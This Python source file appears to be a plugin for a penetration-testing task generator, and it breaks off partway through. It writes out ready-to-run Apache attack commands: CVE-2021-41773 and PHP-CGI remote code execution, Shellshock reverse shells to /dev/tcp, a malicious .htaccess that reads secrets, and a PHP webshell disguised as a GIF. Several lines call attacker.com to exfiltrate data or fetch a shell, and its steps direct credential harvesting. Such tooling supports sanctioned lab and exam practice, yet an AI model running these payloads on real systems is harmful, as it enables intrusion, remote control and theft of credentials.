"""
Apache HTTP Server enumeration plugin

Generates tasks for Apache-specific enumeration including:
- PHP executable extension enumeration
- .htaccess LFI via ErrorDocument exploitation
- Apache confusion attacks (filename, handler, DocumentRoot)
- CGI/Shellshock exploitation
- mod_rewrite path traversal
- Server-status/server-info exposure
- CVE-2021-41773 path traversal
- Old PHP+CGI RCE (CVE-2012-1823/2311)

Extracted from HackTricks: pentesting-web/apache.md, pentesting-web/cgi.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ApachePlugin(ServicePlugin):
    """Apache HTTP Server enumeration plugin"""

    @property
    def name(self) -> str:
        return "apache"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect Apache HTTP servers"""
        service = port_info.get('service', '').lower()
        product = port_info.get('product', '').lower()
        version = port_info.get('version', '').lower()
        extrainfo = port_info.get('extrainfo', '').lower()
        port = port_info.get('port')

        # Reject IIS explicitly (avoid conflicts)
        if 'iis' in product.lower() or 'microsoft iis' in product.lower():
            return False

        # Check for Apache indicators
        if 'apache' in product or 'apache' in version:
            return True

        # Check for httpd (Apache's binary name)
        if 'httpd' in product or 'httpd' in service:
            # But not if it's Microsoft IIS httpd
            if 'microsoft' not in product.lower() and 'iis' not in product.lower():
                return True

        # Check common Apache ports with HTTP service (secondary check)
        if any(svc in service for svc in self.service_names):
            # Additional heuristic: Linux + HTTP often means Apache
            if 'ubuntu' in extrainfo or 'debian' in extrainfo or 'centos' in extrainfo:
                return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Apache enumeration task tree"""
        version = service_info.get('version', 'unknown')
        product = service_info.get('product', 'Apache')
        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'apache-enum-{port}',
            'name': f'Apache HTTP Server Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Task 1: PHP Extension Enumeration (QUICK_WIN)
        tasks['children'].append({
            'id': f'apache-php-ext-{port}',
            'name': 'Enumerate Executable PHP Extensions',
            'type': 'manual',
            'metadata': {
                'command': 'grep -R -B1 "httpd-php" /etc/apache2',
                'description': 'Identify which file extensions Apache executes as PHP (for upload bypass testing)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MANUAL'],
                'flag_explanations': {
                    'grep': 'Search text patterns in files',
                    '-R': 'Recursive search through directories',
                    '-B1': 'Show 1 line before match (includes extension list)',
                    'httpd-php': 'Apache PHP handler configuration pattern'
                },
                'success_indicators': [
                    'Configuration files found: php5.conf, php7.3.conf',
                    'Extension list revealed (e.g., .php, .php3, .php4, .php5, .phtml)',
                    'AddHandler or SetHandler directives visible'
                ],
                'failure_indicators': [
                    'No configuration files found (may not have shell access yet)',
                    'Permission denied errors',
                    'PHP not installed or not using Apache'
                ],
                'next_steps': [
                    'Note all executable extensions for upload bypass testing',
                    'Test upload functionality with discovered extensions',
                    'Check /etc/apache2/mods-available/php*.conf for exact config',
                    'Try extensions: .php, .php3, .php4, .php5, .phtml, .phar'
                ],
                'alternatives': [
                    'Without shell: Test upload with various PHP extensions manually',
                    'Check /etc/apache2/mods-enabled/ directory',
                    'Search web.config or httpd.conf for AddHandler directives',
                    'Fuzzing: Upload test files with extensions from SecLists'
                ],
                'notes': 'Common locations: /etc/apache2/mods-available/, /etc/apache2/mods-enabled/. Critical for upload RCE chains.',
                'estimated_time': '2-3 minutes'
            }
        })

        # Task 2: CVE-2021-41773 Path Traversal (QUICK_WIN)
        tasks['children'].append({
            'id': f'apache-cve-2021-41773-{port}',
            'name': 'CVE-2021-41773 Path Traversal + RCE',
            'type': 'command',
            'metadata': {
                'command': f'curl "{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" --data \'echo Content-Type: text/plain; echo; id; uname\'',
                'description': 'Apache 2.4.49/2.4.50 path traversal vulnerability allowing arbitrary file read and RCE',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT', 'CVE'],
                'flag_explanations': {
                    '.%2e': 'URL-encoded double-dot for path traversal (bypasses normalization)',
                    '--data': 'POST data payload (commands to execute)',
                    '/bin/sh': 'Target shell binary for command execution',
                    'echo Content-Type': 'CGI response header (required for valid response)'
                },
                'success_indicators': [
                    'Command output in response (uid=, uname result)',
                    'HTTP 200 status code',
                    'CGI-formatted output visible'
                ],
                'failure_indicators': [
                    'HTTP 404 - path not found',
                    'HTTP 403 - forbidden or patched',
                    'Apache version not 2.4.49 or 2.4.50',
                    'No cgi-bin directory or disabled'
                ],
                'next_steps': [
                    'If successful: Upgrade to reverse shell',
                    'Read sensitive files: curl /cgi-bin/.%2e/.%2e/.%2e/etc/passwd',
                    'Execute reverse shell: --data "echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
                    'Document full exploit chain for writeup'
                ],
                'alternatives': [
                    f'Manual file read: curl "{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"',
                    'Metasploit: exploit/multi/http/apache_normalize_path_rce',
                    'Try variations: /%2e/, /.../, /.%%32%65/ (double encoding)'
                ],
                'notes': 'CVE-2021-41773 (2.4.49), CVE-2021-42013 (2.4.50). Requires cgi-bin enabled. OSCP:HIGH - common in modern vulnerable labs.',
                'estimated_time': '3-5 minutes'
            }
        })

        # Task 3: .htaccess LFI via ErrorDocument (HIGH VALUE)
        htaccess_lfi_tasks = {
            'id': f'apache-htaccess-lfi-{port}',
            'name': '.htaccess LFI via ErrorDocument',
            'type': 'parent',
            'children': [
                {
                    'id': f'apache-htaccess-check-override-{port}',
                    'name': 'Verify AllowOverride FileInfo Enabled',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check if target allows .htaccess to override ErrorDocument (required for LFI attack)',
                        'tags': ['OSCP:HIGH', 'ENUM', 'MANUAL'],
                        'success_indicators': [
                            'AllowOverride FileInfo or AllowOverride All in Apache config',
                            '.htaccess file upload/modification possible',
                            'Target is shared hosting or supports userdir (~user/)',
                            'SFTP/FTP access to web directory'
                        ],
                        'failure_indicators': [
                            'AllowOverride None in config',
                            'No write access to web directories',
                            'Root-owned .htaccess with no rename permissions',
                            'Server ignores .htaccess files'
                        ],
                        'next_steps': [
                            'If upload possible: Craft malicious .htaccess',
                            'If SFTP/FTP access: Rename existing .htaccess, upload malicious one',
                            'Technique: mv .htaccess .htaccess.bk; put evil.htaccess .htaccess',
                            'Target userdir paths: /~username/, /home/user/public_html/'
                        ],
                        'alternatives': [
                            'Test .htaccess support: Upload .htaccess with Header set X-Test "works"',
                            'Check HTTP response headers for X-Test header',
                            'Brute-force userdir: gobuster dir -u {base_url} -w /usr/share/seclists/Usernames/Names/names.txt -p ~'
                        ],
                        'notes': 'Requirements: Apache 2.4+, AllowOverride FileInfo, writable web directory. Common on shared hosting.'
                    }
                },
                {
                    'id': f'apache-htaccess-craft-{port}',
                    'name': 'Craft Malicious .htaccess',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create .htaccess with ErrorDocument LFI payload using ap_expr file() function',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'MANUAL'],
                        'command': 'echo -e "Header always set X-Debug-Tenant \\"demo\\"\\nErrorDocument 404 %{file:/etc/passwd}" > .htaccess',
                        'flag_explanations': {
                            'ErrorDocument 404': 'Custom 404 error handler (triggers on non-existent paths)',
                            '%{file:/etc/passwd}': 'ap_expr file() function - reads absolute file path',
                            'Header always set': 'Marker header to identify your tenant/request'
                        },
                        'success_indicators': [
                            '.htaccess file created with LFI payload',
                            'Syntax validated (no Apache errors on upload)',
                            'File uploaded to web-accessible directory'
                        ],
                        'next_steps': [
                            'Upload .htaccess to target directory',
                            'Trigger 404 by requesting non-existent file',
                            'curl -s {base_url}/~user/does-not-exist',
                            'Verify /etc/passwd contents in response body',
                            'Rotate targets: /etc/shadow, /var/www/html/config.php, application source'
                        ],
                        'alternatives': [
                            'Target application config: ErrorDocument 404 %{file:/var/www/html/config.php}',
                            'Read SSH keys: ErrorDocument 404 %{file:/home/user/.ssh/id_rsa}',
                            'Database credentials: ErrorDocument 404 %{file:/var/www/html/wp-config.php}'
                        ],
                        'notes': 'Only absolute paths work. Read permissions limited to Apache user (www-data). References: HTB Zero writeup, Apache 2.4 custom-error docs.'
                    }
                },
                {
                    'id': f'apache-htaccess-exploit-{port}',
                    'name': 'Trigger LFI and Harvest Secrets',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -s {base_url}/~user/does-not-exist | sed -n \'1,50p\'',
                        'description': 'Trigger 404 to execute .htaccess ErrorDocument LFI and read sensitive files',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '-s': 'Silent mode (no progress bar)',
                            'sed -n \'1,50p\'': 'Display first 50 lines of output',
                            '/does-not-exist': 'Non-existent path to trigger 404'
                        },
                        'success_indicators': [
                            'File contents visible in HTTP response body',
                            '/etc/passwd structure visible',
                            'Database credentials harvested',
                            'Application source code revealed'
                        ],
                        'failure_indicators': [
                            'Standard 404 error page (LFI not triggered)',
                            'Empty response',
                            'Permission denied (file not readable by www-data)',
                            '.htaccess ignored or syntax error'
                        ],
                        'next_steps': [
                            'Extract credentials from config files',
                            'Map application directory structure',
                            'Read application source for vulnerabilities',
                            'Harvest API keys, database passwords, encryption keys',
                            'Document findings: "LFI via .htaccess ErrorDocument" for writeup'
                        ],
                        'alternatives': [
                            'Automate: for file in /etc/passwd /etc/shadow /var/www/html/config.php; do ...; done',
                            'Target logs: /var/log/apache2/access.log (for log poisoning chain)',
                            'Chain with upload: Upload webshell source, read via LFI, discover more paths'
                        ],
                        'notes': 'Effective read permissions = Apache user. Target DocumentRoot files for source disclosure. HTB Zero demonstrates this technique.'
                    }
                }
            ]
        }
        tasks['children'].append(htaccess_lfi_tasks)

        # Task 4: mod_rewrite Confusion Attacks
        confusion_tasks = {
            'id': f'apache-confusion-{port}',
            'name': 'Apache Confusion Attacks',
            'type': 'parent',
            'children': [
                {
                    'id': f'apache-path-truncation-{port}',
                    'name': 'mod_rewrite Path Truncation',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/user/orange%2Fsecret.yml%3F"',
                        'description': 'Abuse mod_rewrite ? truncation to bypass path restrictions and access arbitrary files',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            '%2F': 'URL-encoded forward slash (/)',
                            '%3F': 'URL-encoded question mark (?) - triggers mod_rewrite truncation',
                            'secret.yml': 'Target file outside intended directory'
                        },
                        'success_indicators': [
                            'File contents from unexpected path visible',
                            'Path restriction bypassed (accessed /user/orange/secret.yml)',
                            'HTTP 200 with sensitive file data'
                        ],
                        'failure_indicators': [
                            'HTTP 404 - file not found',
                            'HTTP 403 - access denied',
                            'mod_rewrite not in use',
                            'Truncation not occurring'
                        ],
                        'next_steps': [
                            'Map rewrite rules: Check for patterns like "^/user/(.+)$" → "/var/user/$1/profile.yml"',
                            'Fuzz paths: Try accessing config files, source code',
                            'Test variations: %3F at different positions in URL',
                            'Combine with directory traversal: /user/../../etc/passwd%3F'
                        ],
                        'alternatives': [
                            'Test without encoding: /user/orange/secret.yml?',
                            'Try double encoding: %253F',
                            'Burp Intruder: Fuzz all path segments with %3F'
                        ],
                        'notes': 'mod_rewrite trims r->filename after ?. Documented by Orange Tsai: https://blog.orange.tw/2024/08/confusion-attacks-en.html'
                    }
                },
                {
                    'id': f'apache-handler-mislead-{port}',
                    'name': 'Handler Assignment Bypass (PHP Execution)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/upload/shell.gif%3Fexec.php"',
                        'description': 'Execute uploaded image file as PHP by appending .php after ? in URL',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            'shell.gif': 'Uploaded file with malicious PHP code disguised as GIF',
                            '%3Fexec.php': 'URL-encoded ?exec.php triggers PHP handler',
                            'RewriteRule': 'Apache rule: ^(.+\\.php)$ triggers PHP execution'
                        },
                        'success_indicators': [
                            'PHP code executed (command output visible)',
                            'GIF file processed as PHP script',
                            'Shell access obtained',
                            'HTTP 200 with code execution results'
                        ],
                        'failure_indicators': [
                            'GIF rendered as image',
                            'PHP code visible in source (not executed)',
                            'HTTP 403 or 500 error',
                            'RewriteRule not configured for .php handler'
                        ],
                        'next_steps': [
                            'Upload malicious GIF: GIF89a <?=`id`;?>',
                            'Access with ?exec.php to trigger execution',
                            'Upgrade to full webshell',
                            'Test other image formats: .jpg, .png, .bmp',
                            'Chain with file upload vulnerabilities'
                        ],
                        'alternatives': [
                            'Try different extensions after ?: ?shell.php, ?cmd.php',
                            'Test without URL encoding: /upload/shell.gif?exec.php',
                            'Combine with null byte: shell.gif%00.php (older PHP)'
                        ],
                        'notes': 'Requires RewriteRule setting handler based on extension. Upload malicious image first. Orange Tsai research.'
                    }
                },
                {
                    'id': f'apache-acl-bypass-{port}',
                    'name': 'ACL Bypass via PHP-FPM Query Truncation',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/admin.php%3Fbypass.php"',
                        'description': 'Bypass Files-based authentication by exploiting PHP-FPM query string truncation',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT'],
                        'flag_explanations': {
                            'admin.php': 'Protected file (requires authentication)',
                            '%3Fbypass.php': 'Query string (PHP-FPM strips after ?)',
                            'Files directive': 'Apache ACL protecting admin.php'
                        },
                        'success_indicators': [
                            'admin.php accessed without authentication',
                            'No 401 Unauthorized response',
                            'Protected content visible',
                            'HTTP 200 status'
                        ],
                        'failure_indicators': [
                            'HTTP 401 - authentication still required',
                            'HTTP 404 - file not found',
                            'Not using PHP-FPM (using mod_php)',
                            'Files directive properly configured'
                        ],
                        'next_steps': [
                            'Test all protected files discovered during enumeration',
                            'Document bypass in writeup',
                            'Escalate access through admin panel',
                            'Check for other PHP-FPM misconfigurations'
                        ],
                        'alternatives': [
                            'Test without encoding: /admin.php?anything',
                            'Try variations: admin.php%3Fx, admin.php%3F',
                            'Fuzz protected paths: ffuf -u {base_url}/FUZZ%3Fbypass.php -w paths.txt'
                        ],
                        'notes': 'PHP-FPM removes query strings before processing. Apache ACL checks full URL. Mismatch = bypass. Orange Tsai technique.'
                    }
                },
                {
                    'id': f'apache-documentroot-confusion-{port}',
                    'name': 'DocumentRoot Confusion (Filesystem Access)',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/html/etc/passwd.html"',
                        'description': 'Exploit Apache dual-path resolution to access filesystem outside DocumentRoot',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '/html/': 'Triggers RewriteRule processing',
                            'etc/passwd.html': 'File path resolved from both DocumentRoot and /',
                            'RewriteRule': '^/html/(.*)$ → /$1.html'
                        },
                        'success_indicators': [
                            '/etc/passwd contents visible in response',
                            'Files from / filesystem accessible',
                            'Filesystem traversal successful',
                            'HTTP 200 with sensitive data'
                        ],
                        'failure_indicators': [
                            'HTTP 404 - file not found',
                            'HTTP 403 - forbidden',
                            'Only DocumentRoot files accessible',
                            'RewriteRule not configured this way'
                        ],
                        'next_steps': [
                            'Map accessible filesystem paths',
                            'Read common sensitive files: /etc/shadow, /etc/passwd',
                            'Target application config: /var/www/app/config.php',
                            'Harvest credentials and secrets',
                            'Chain with other vulnerabilities'
                        ],
                        'alternatives': [
                            'Test variations: /html/var/www/html/config.php.html',
                            'Fuzz common paths: /html/home/user/.ssh/id_rsa.html',
                            'Try without .html extension if RewriteRule differs'
                        ],
                        'notes': 'Apache checks both /var/www/html/<path> and /<path>. RewriteRule enables dual resolution. Orange Tsai research.'
                    }
                },
                {
                    'id': f'apache-cgi-source-disclosure-{port}',
                    'name': 'CGI Source Code Disclosure',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/html/usr/lib/cgi-bin/download.cgi%3F"',
                        'description': 'Disclose CGI script source code by adding %3F (bypasses CGI execution)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '%3F': 'URL-encoded ? prevents CGI execution',
                            '/html/': 'DocumentRoot confusion trigger',
                            '/usr/lib/cgi-bin/': 'Common CGI script location'
                        },
                        'success_indicators': [
                            'CGI script source code visible (#!/usr/bin/perl, etc.)',
                            'Script logic and credentials exposed',
                            'HTTP 200 with text/plain content',
                            'No CGI execution (raw source returned)'
                        ],
                        'failure_indicators': [
                            'CGI executed normally (output not source)',
                            'HTTP 404 - script not found',
                            'HTTP 403 - access denied',
                            'Binary CGI (compiled, not script)'
                        ],
                        'next_steps': [
                            'Analyze source for vulnerabilities',
                            'Extract hardcoded credentials',
                            'Identify command injection points',
                            'Map application logic',
                            'Test discovered vulnerabilities'
                        ],
                        'alternatives': [
                            'Try direct: /cgi-bin/download.cgi%3F',
                            'Test all discovered CGI scripts',
                            'Combine with directory traversal: /html/../../cgi-bin/admin.cgi%3F'
                        ],
                        'notes': 'Reveals CGI source code for vulnerability analysis. Critical for understanding application logic. Orange Tsai technique.',
                        'estimated_time': '5-10 minutes'
                    }
                }
            ]
        }
        tasks['children'].append(confusion_tasks)

        # Task 5: Shellshock (CGI-based)
        shellshock_tasks = {
            'id': f'apache-shellshock-{port}',
            'name': 'Shellshock (CGI Bash Injection)',
            'type': 'parent',
            'children': [
                {
                    'id': f'apache-shellshock-detect-{port}',
                    'name': 'Detect Shellshock Vulnerability',
                    'type': 'command',
                    'metadata': {
                        'command': f'nmap {target} -p {port} --script=http-shellshock --script-args uri=/cgi-bin/status',
                        'description': 'Automated Shellshock detection on CGI endpoints',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '--script=http-shellshock': 'NSE script to detect Shellshock vulnerability',
                            '--script-args uri=/cgi-bin/status': 'Target CGI script path',
                            'nmap': 'Network scanner with scripting capabilities'
                        },
                        'success_indicators': [
                            'VULNERABLE TO SHELLSHOCK detected',
                            'CGI script found and exploitable',
                            'Old Bash version confirmed'
                        ],
                        'failure_indicators': [
                            'Not vulnerable message',
                            'No CGI scripts found',
                            'Bash patched (post-2014)',
                            'HTTP 404 on CGI paths'
                        ],
                        'next_steps': [
                            'Identify all CGI endpoints: /cgi-bin/, /cgi-sys/, /scripts/',
                            'Test manually with curl for confirmation',
                            'Prepare exploitation payload',
                            'Try multiple CGI files: admin.cgi, user.cgi, status.cgi'
                        ],
                        'alternatives': [
                            f'Manual test: curl -H \'User-Agent: () {{ :; }}; echo "VULNERABLE"\' {base_url}/cgi-bin/status 2>/dev/null | grep VULNERABLE',
                            f'nikto -h {base_url} -Cgidirs all (comprehensive CGI testing)',
                            'Fuzzing: gobuster dir -u {base_url} -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt'
                        ],
                        'notes': 'Shellshock (CVE-2014-6271): Bash environment variable injection. Common on old Linux systems.',
                        'estimated_time': '2-5 minutes'
                    }
                },
                {
                    'id': f'apache-shellshock-exploit-{port}',
                    'name': 'Exploit Shellshock for RCE',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -H \'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1\' {base_url}/cgi-bin/status',
                        'description': 'Execute reverse shell via Shellshock vulnerability',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '() { :; };': 'Bash function definition (Shellshock exploit vector)',
                            '/bin/bash -i': 'Interactive bash shell',
                            '>& /dev/tcp/LHOST/LPORT': 'Redirect I/O to TCP socket (reverse shell)',
                            'User-Agent': 'HTTP header parsed as environment variable by CGI'
                        },
                        'success_indicators': [
                            'Reverse shell connection received',
                            'Shell prompt appears on listener',
                            'Command execution confirmed (id, whoami)',
                            'HTTP request completes without error'
                        ],
                        'failure_indicators': [
                            'No connection received',
                            'HTTP error response',
                            'Firewall blocking outbound connections',
                            'Bash patched or CGI not using Bash'
                        ],
                        'next_steps': [
                            'Setup listener first: nc -lvnp LPORT',
                            'Replace LHOST/LPORT with attacker IP and port',
                            'Stabilize shell: python -c \'import pty; pty.spawn("/bin/bash")\'',
                            'Escalate privileges: sudo -l, SUID binaries',
                            'Document exploit chain for writeup'
                        ],
                        'alternatives': [
                            'Blind RCE test: curl -H \'User-Agent: () { :; }; sleep 10\' (timing-based)',
                            'Out-of-band: curl -H \'Cookie: () { :;}; curl http://attacker.com/$(whoami)\' (DNS/HTTP exfil)',
                            'Metasploit: exploit/multi/http/apache_mod_cgi_bash_env_exec',
                            'Bind shell: nc -l -p 9999 -e /bin/sh'
                        ],
                        'notes': 'Test all HTTP headers: User-Agent, Cookie, Referer, Accept-Language. CGI converts headers to env vars.',
                        'estimated_time': '5-10 minutes'
                    }
                },
                {
                    'id': f'apache-shellshock-alternative-headers-{port}',
                    'name': 'Test Alternative HTTP Headers',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test Shellshock via Cookie, Referer, Accept-Language headers (alternative to User-Agent)',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                        'success_indicators': [
                            'Command execution via Cookie header',
                            'Referer header injection successful',
                            'Alternative header bypasses filtering'
                        ],
                        'next_steps': [
                            'Test payload in Cookie: curl -H \'Cookie: () { :;}; id\'',
                            'Test Referer: curl -H \'Referer: () { :;}; whoami\'',
                            'Test Accept-Language: curl -H \'Accept-Language: () { :;}; uname -a\'',
                            'Identify which headers are processed by CGI',
                            'Use successful header for reverse shell'
                        ],
                        'alternatives': [
                            'Burp Intruder: Test all request headers with payload',
                            'Script rotation: for header in User-Agent Cookie Referer; do ...; done',
                            'WAF bypass: Rotate headers to evade signature detection'
                        ],
                        'notes': 'CGI creates environment variables from ALL HTTP headers. Try all headers if User-Agent blocked.'
                    }
                }
            ]
        }
        tasks['children'].append(shellshock_tasks)

        # Task 6: Old PHP + CGI RCE
        tasks['children'].append({
            'id': f'apache-old-php-cgi-rce-{port}',
            'name': 'Old PHP+CGI RCE (CVE-2012-1823, CVE-2012-2311)',
            'type': 'command',
            'metadata': {
                'command': f'curl -i --data-binary "<?php system(\\"id\\"); ?>" "{base_url}/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"',
                'description': 'Exploit PHP < 5.3.12/5.4.2 with CGI mode to achieve RCE via query string injection',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE'],
                'flag_explanations': {
                    '-d allow_url_include=1': 'Enable PHP remote file inclusion',
                    '-d auto_prepend_file=php://input': 'Prepend POST body as PHP code',
                    '--data-binary': 'Send POST body without modifications',
                    '<?php system("id"); ?>': 'PHP code to execute (replace with desired command)'
                },
                'success_indicators': [
                    'Command output in response (uid=, gid=)',
                    'PHP code executed successfully',
                    'HTTP 200 status',
                    'RCE confirmed'
                ],
                'failure_indicators': [
                    'HTTP 404 or 500 error',
                    'PHP version >= 5.3.12 (patched)',
                    'Not using CGI mode (using mod_php or FPM)',
                    'Query string not processed as arguments'
                ],
                'next_steps': [
                    'Test source disclosure first: curl {base_url}/index.php?-s',
                    'If source visible: Vulnerable to CVE-2012-1823',
                    'Escalate to reverse shell: system("bash -i >& /dev/tcp/LHOST/LPORT 0>&1")',
                    'Upload webshell: system("wget http://attacker.com/shell.php -O /var/www/html/shell.php")',
                    'Document CVE chain for writeup'
                ],
                'alternatives': [
                    'Source disclosure test: curl {base_url}/index.php?-s (reveals PHP source)',
                    'Command execution: /?-d+allow_url_include=1+-d+auto_prepend_file=php://input with POST <?=`id`?>',
                    'File read: /?-d+allow_url_include=1+-d+auto_prepend_file=/etc/passwd',
                    'CTF writeup: https://github.com/W3rni0/HacktivityCon_CTF_2020#gi-joe'
                ],
                'notes': 'CVEs: CVE-2012-1823, CVE-2012-2311. Requires CGI SAPI (not mod_php). Test /?-s first for quick check.',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 7: Server Status/Info Exposure
        tasks['children'].append({
            'id': f'apache-server-status-{port}',
            'name': 'Check server-status and server-info',
            'type': 'parent',
            'children': [
                {
                    'id': f'apache-server-status-check-{port}',
                    'name': 'Access /server-status',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i {base_url}/server-status',
                        'description': 'Check for exposed Apache server-status page (reveals active connections, URLs, IPs)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '/server-status': 'Apache mod_status endpoint',
                            '-i': 'Include HTTP headers in output'
                        },
                        'success_indicators': [
                            'HTTP 200 status',
                            'Apache Server Status page visible',
                            'Active connections and URLs listed',
                            'Client IP addresses revealed'
                        ],
                        'failure_indicators': [
                            'HTTP 403 Forbidden (access restricted)',
                            'HTTP 404 Not Found (disabled)',
                            'Require local directive blocks external access'
                        ],
                        'next_steps': [
                            'Monitor for sensitive URLs in active requests',
                            'Harvest internal IP addresses',
                            'Identify authenticated sessions',
                            'Check /server-status?auto for machine-readable format',
                            'Document information disclosure'
                        ],
                        'alternatives': [
                            f'Browser: Navigate to {base_url}/server-status',
                            f'curl {base_url}/server-status?auto (parseable output)',
                            'Try /server-status?refresh=5 for live monitoring'
                        ],
                        'notes': 'Common misconfiguration. Reveals active requests, session data, internal architecture.',
                        'estimated_time': '2 minutes'
                    }
                },
                {
                    'id': f'apache-server-info-check-{port}',
                    'name': 'Access /server-info',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -i {base_url}/server-info',
                        'description': 'Check for exposed server-info page (reveals loaded modules, configuration)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '/server-info': 'Apache mod_info endpoint',
                            '-i': 'Include HTTP headers'
                        },
                        'success_indicators': [
                            'HTTP 200 status',
                            'Loaded Apache modules listed',
                            'Configuration directives visible',
                            'DocumentRoot and paths revealed'
                        ],
                        'failure_indicators': [
                            'HTTP 403 or 404',
                            'mod_info not enabled',
                            'Access restricted to localhost'
                        ],
                        'next_steps': [
                            'Note enabled modules for attack surface',
                            'Check for vulnerable modules (mod_cgi, mod_rewrite)',
                            'Map DocumentRoot and configuration',
                            'Identify security misconfigurations'
                        ],
                        'alternatives': [
                            f'Browser: {base_url}/server-info',
                            'Check for /server-info?config (detailed config)'
                        ],
                        'notes': 'Reveals Apache modules and configuration. Useful for tailoring attacks.',
                        'estimated_time': '2 minutes'
                    }
                }
            ]
        })

        # Task 8: Centralized CGI Dispatcher Exploitation
        tasks['children'].append({
            'id': f'apache-cgi-dispatcher-{port}',
            'name': 'Centralized CGI Dispatcher Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit single CGI endpoints using selector parameters (common in embedded devices)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MANUAL'],
                'success_indicators': [
                    'CGI dispatcher identified (e.g., /cgi-bin/cstecgi.cgi)',
                    'Handler names enumerated via JS/HTML scraping',
                    'Unauthenticated handler access discovered',
                    'Parameter injection successful'
                ],
                'next_steps': [
                    'Enumerate handlers: grep JS/HTML for topicurl=<name> patterns',
                    'Test authentication bypass: POST topicurl=sensitiveHandler',
                    'Parameter injection: topicurl=setConfig&param=;id;',
                    'Option injection: topicurl=runTool&opts=-n (manipulate argv)',
                    'Arbitrary file write: topicurl=setWizard&path=/etc/init.d/S99backdoor'
                ],
                'alternatives': [
                    'Scrape JavaScript: grep -r "topicurl" /path/to/extracted/firmware',
                    'Brute-force handlers: ffuf -u {base_url}/cgi-bin/main.cgi -d "topicurl=FUZZ" -w handlers.txt',
                    'Monitor network: Intercept requests to identify handler names',
                    'Firmware analysis: binwalk -e firmware.bin && grep -r topicurl'
                ],
                'notes': 'Common pattern in embedded devices (routers, IoT). Reference: Unit 42 TOTOLINK research. Test for command injection and file write.'
            }
        })

        # Task 9: HTTP Proxy Header Injection (CGI)
        tasks['children'].append({
            'id': f'apache-cgi-proxy-mitm-{port}',
            'name': 'CGI HTTP_PROXY Environment Variable MitM',
            'type': 'command',
            'metadata': {
                'command': f'curl -H "Proxy: http://attacker.com:8080" {base_url}/cgi-bin/test.cgi',
                'description': 'Inject Proxy header to intercept server-side requests made by CGI scripts',
                'tags': ['OSCP:LOW', 'EXPLOIT'],
                'flag_explanations': {
                    'Proxy: http://attacker.com:8080': 'HTTP header becomes HTTP_PROXY env var in CGI',
                    'CGI environment': 'All headers converted to HTTP_* variables',
                    'HTTP_PROXY': 'Used by some HTTP clients for proxy configuration'
                },
                'success_indicators': [
                    'Server-side requests intercepted on attacker proxy',
                    'HTTP traffic visible in proxy logs',
                    'Credentials or API keys captured',
                    'Internal API endpoints discovered'
                ],
                'failure_indicators': [
                    'No traffic received on proxy',
                    'CGI script doesn\'t make HTTP requests',
                    'HTTP_PROXY variable not used by application',
                    'Firewall blocks outbound connections'
                ],
                'next_steps': [
                    'Setup proxy listener: mitmproxy -p 8080',
                    'Monitor for server-side requests',
                    'Capture credentials from proxied requests',
                    'Map internal API endpoints',
                    'Test for SSRF vulnerabilities'
                ],
                'alternatives': [
                    'HTTP server: python3 -m http.server 8080 (log requests)',
                    'Burp Collaborator: Use Burp Collaborator URL',
                    'Test other headers: X-Forwarded-For, X-Real-IP'
                ],
                'notes': 'CGI creates HTTP_* env vars from headers. Some libraries use HTTP_PROXY for proxy config. Low success rate.',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 10: Exploit Research (Conditional)
        if version and version != 'unknown':
            tasks['children'].append({
                'id': f'apache-exploit-research-{port}',
                'name': f'Exploit Research: Apache {version}',
